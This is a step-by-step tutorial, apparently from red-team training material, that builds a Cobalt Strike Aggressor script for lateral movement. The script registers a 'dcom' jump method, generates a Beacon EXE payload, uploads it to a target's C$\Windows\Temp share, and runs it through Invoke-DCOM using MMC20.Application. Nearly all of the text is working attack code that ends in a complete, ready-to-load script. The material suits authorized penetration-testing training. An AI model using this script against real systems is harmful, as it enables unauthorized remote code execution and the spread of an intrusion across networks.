# Jump & Remote-Exec

Aggressor can be used to register new techniques under `jump` and `remote-exec` using [beacon\_remote\_exploit\_register](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics\_aggressor-scripts/as-resources\_functions.htm#beacon\_remote\_exploit\_register) and [beacon\_remote\_exec\_method\_register](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics\_aggressor-scripts/as-resources\_functions.htm#beacon\_remote\_exec\_method\_register) respectively.

In this example, we'll integrate `Invoke-DCOM.ps1` into `jump`.  First, create a new text file in Visual Studio and save is somewhere as `dcom.cna`.  Then add the following skeleton.

{% code overflow="wrap" %}
```csharp
sub invoke_dcom
{
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```
{% endcode %}

This will register "dcom" as a new option inside the jump command and specifies `invoke_dcom` as the associated callback function.  The first thing to add inside this callback are some local variable declarations.

{% code overflow="wrap" %}
```csharp
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```
{% endcode %}

`local` defines variables that are local to the current function, so they will disappear once executed.  Sleep can have `global`, `closure-specific` and `local` scopes.  More information can be found in **5.2 Scalar Scope** of the Sleep manual.

The next step is to acknowledge receipt of the task using [btask](https://download.cobaltstrike.com/aggressor-script/functions.html#btask).  This takes the ID of the Beacon, the text to post and an ATT\&CK tactic ID.  This will print a message to the Beacon console and add it to the data model used in the activity and session reports that you can generate from Cobalt Strike.

{% code overflow="wrap" %}
```csharp
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
}
```
{% endcode %}

You'll notice `$1`, `$2` and `$3` variables here which are automatically passed in by the client.  Where:

* $1 is the Beacon ID.
* $2 is the target to jump to.
* $3 is the selected listener.

Furthermore, [listener\_describe](https://download.cobaltstrike.com/aggressor-script/functions.html#listener\_describe) expands a listener name into a more detailed description.  For example, instead of "smb" it will say "windows/beacon\_bind\_pipe (\\\\.\pipe\\\<pipename>)".

Next, we want to read in the Invoke-DCOM script from our machine.  This can be done [openf](http://sleep.dashnine.org/manual/openf.html), [getFileProper](http://sleep.dashnine.org/manual/getFileProper.html) and [script\_resource](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics\_aggressor-scripts/as-resources\_functions.htm#script\_resource).  Notice how we're assigning values to the variables we declared at the start.

```csharp
# read the script
$handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
$script = readb($handle, -1);
closef($handle);
```

The `$script` variable now holds the raw content of Invoke-DCOM.ps1.  For Beacon to utilise it, we can use [beacon\_host\_script](https://download.cobaltstrike.com/aggressor-script/functions.html#beacon\_host\_script) - this will host the script inside Beacon and returns a short snippet for running it.

```csharp
# host the script in Beacon
$oneliner = beacon_host_script($1, $script);
```

If you want to see the content of these variables, you can use `println($oneliner);` and they'll appear in the Script Console (_Cobalt Strike > Script Console_).

The next step is to generate and upload a payload to the target using [artifact\_payload](https://download.cobaltstrike.com/aggressor-script/functions.html#artifact\_payload) and [bupload\_raw](https://download.cobaltstrike.com/aggressor-script/functions.html#bupload\_raw).  This will generate an EXE payload and upload it to the target in the `C:\Windows\Temp` directory.

```csharp
# generate stageless payload
$payload = artifact_payload($3, "exe", "x64");

# upload to the target
bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);
```

`$+` concatenates an interpolated string and requires additional whitespaces on each end.

Then, [bpowerpick](https://download.cobaltstrike.com/aggressor-script/functions.html#bpowerpick) can execute the Invoke-DCOM oneliner.  We pass it the target computer name and the path to the uploaded payload.  Also, because this could be a P2P payload - we want to automatically try and link to it, which can be done with [beacon\_link](https://download.cobaltstrike.com/aggressor-script/functions.html#beacon\_link).

{% code overflow="wrap" %}
```csharp
# run via powerpick
bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

# link if p2p beacon
beacon_link($1, $2, $3);
```
{% endcode %}

The final script:

{% code overflow="wrap" %}
```csharp
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```
{% endcode %}

Make sure to load the script via the Script Manger (_Cobalt Strike > Script Manager_).

The flexibility of Aggressor means that we can leverage anything from PowerShell, execute-assembly, shellcode injection, DLL injection and more.
